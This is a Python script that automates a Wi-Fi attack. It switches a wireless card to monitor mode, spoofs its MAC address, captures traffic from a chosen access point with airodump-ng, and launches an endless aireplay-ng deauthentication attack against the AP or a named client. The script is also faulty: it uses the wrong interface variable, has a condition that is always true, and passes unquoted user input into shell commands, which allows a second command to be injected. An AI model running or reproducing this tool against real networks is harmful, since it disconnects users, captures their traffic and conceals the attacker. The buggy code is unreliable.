#!/usr/bin/env python3
import os
import re
import subprocess

#check if user is in root
if os.getuid() != 0:
    print("Error: This script must be run as root")
    exit(1)
#Find externally connected interface with an IP address
ip_regex = re.compile(r"inet (?:addr:)?([\d.]+)")
interfaces = [iface for iface in os.listdir('/sys/class/net/') if not iface.startswith('lo') and not iface.startswith('wlp0s20f3') and not iface.startswith('enp57s0f1')]

for interface in interfaces:
    try:
        output = subprocess.check_output(['ifconfig', interface])
        ip_match = ip_regex.search(str(output))
        if ip_match:
            external_interface = interface
            break
    except subprocess.CalledProcessError:
        print(f"Error: failed to execute ifconfig on {interface}")
        pass

#set interface to monitor mode and change the MAC address

os.system(f'sudo ifconfig {interface} down')
os.system(f'sudo iwconfig {interface} mode monitor')
os.system(f'sudo macchanger -rb {interface}')
os.system(f'sudo ifconfig {interface} up')


#run the airodump survey
filename = input("Enter file name:")
bssid = input("Enter target AP BSSID:")
channel = input("Enter target channel:")

os.system(f'sudo  airodump-ng --band abg -w {filename} --bssid {bssid} --channel {channel} {interface}mon')
if 	subprocess.CalledProcessError:
	os.system(f'sudo  airodump-ng --band abg -w {filename} --bssid {bssid} --channel {channel} {interface}')

attack_answer = input("Do you want to run an aireplay attack on this AP? (yes/no)")
if attack_answer.lower() == "yes":
	client_answer = input("Do you want to target a client MAC? (yes/no)")
	if client_answer.lower() == "yes":
		client_mac = input("Enter client mac address:")
		os.system(f'sudo aireplay-ng -0 0 -a {bssid} -c {client_mac} {interface}')
	if client_answer.lower() == "no":
		os.system(f'sudo aireplay-ng -0 0 -a {bssid} {interface}')
    
#return card to managed mode after user does the dew
os.system(f'sudo iwconfig {interface} mode managed')
